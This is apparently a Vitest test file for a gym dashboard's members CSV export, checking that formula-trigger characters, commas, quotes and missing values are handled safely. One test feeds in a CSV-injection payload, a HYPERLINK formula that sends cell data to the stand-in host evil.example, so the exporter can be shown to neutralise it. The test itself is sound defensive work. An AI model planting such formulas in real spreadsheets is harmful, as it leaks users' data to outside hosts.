import { describe, it, expect } from "vitest";
import {
  buildMembersCsv,
  MEMBERS_CSV_HEADERS,
  type MembersCsvRow,
} from "@/app/dashboard/gym-owner/members/members-csv";

// The Export button on the gym members list downloads this. Member names and
// emails are typed by the members, so a name must never run as a formula when
// the owner opens the file in a spreadsheet.

function row(overrides: Partial<MembersCsvRow> = {}): MembersCsvRow {
  return {
    name: "Ada Obi",
    email: "ada@example.com",
    plan: "Monthly",
    status: "Active",
    joined: "1 Aug 2026",
    amount: 15000,
    currency: "NGN",
    ...overrides,
  };
}

function bodyCells(csv: string): string[] {
  return csv.split("\n")[1].split(",");
}

describe("buildMembersCsv", () => {
  it("emits the header row even for an empty export", () => {
    expect(buildMembersCsv([])).toBe(MEMBERS_CSV_HEADERS.join(","));
  });

  it("writes one plain row per member", () => {
    expect(buildMembersCsv([row()]).split("\n")[1]).toBe(
      "Ada Obi,ada@example.com,Monthly,Active,1 Aug 2026,15000,NGN",
    );
  });

  it.each(["=", "+", "-", "@"])(
    "neutralises a name starting with %s so it stays text",
    (trigger) => {
      const name = `${trigger}HYPERLINK("http://evil.example/?d="&A1;"Open")`;
      const [cell] = bodyCells(buildMembersCsv([row({ name })]));
      // The apostrophe makes the spreadsheet treat the cell as literal text.
      expect(cell.startsWith(`"'${trigger}`)).toBe(true);
    },
  );

  it("neutralises formula triggers in the email and plan too", () => {
    const [, email, plan] = bodyCells(
      buildMembersCsv([row({ email: "@SUM(1)", plan: "=1+1" })]),
    );
    expect(email).toBe("'@SUM(1)");
    expect(plan).toBe("'=1+1");
  });

  it("quotes commas and doubles embedded quotes instead of breaking columns", () => {
    const csv = buildMembersCsv([row({ name: 'Obi, "Ada"' })]);
    expect(csv.split("\n")[1].startsWith('"Obi, ""Ada""",')).toBe(true);
  });

  it("leaves a missing amount or currency blank, not 'undefined'", () => {
    const csv = buildMembersCsv([row({ amount: undefined, currency: undefined })]);
    expect(csv.split("\n")[1].endsWith(",,")).toBe(true);
    expect(csv).not.toContain("undefined");
  });
});
